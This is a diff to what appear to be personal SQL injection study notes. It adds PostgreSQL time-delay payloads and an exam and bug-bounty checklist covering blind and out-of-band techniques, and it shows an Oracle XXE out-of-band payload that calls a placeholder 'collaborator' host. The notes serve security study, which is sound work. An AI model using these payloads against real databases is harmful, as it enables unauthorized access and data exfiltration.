@@ -45,7 +45,11 @@ server synchronous (time delay):
 - postgresql
 
   ```sql
-  '||pg_sleep(10))--
+  '||pg_sleep(10)--
+  ```
+
+  ```sql
+  ';SELECT NULL from pg_sleep(10)--
   ```
 
 - oracle:
@@ -71,7 +75,22 @@ server asynchronous (out of band):
   'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//collaborator/">+%25remote%3b]>'),'/l')+FROM+dual--;
   ```
 
-## TODO
+## Prepare for exam (bug bounty too)
+
+[cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+- determine version
+- blind or not
+- find number of columns return by query
+- check columns data type
+
+- if blind
+  - time delay check
+  - time delay data retrieval
+  - conditional response: compare reponse
+  - conditional error: compare status code
+  - oob interaction
+  - oob data exfiltration
 
 ## References
 
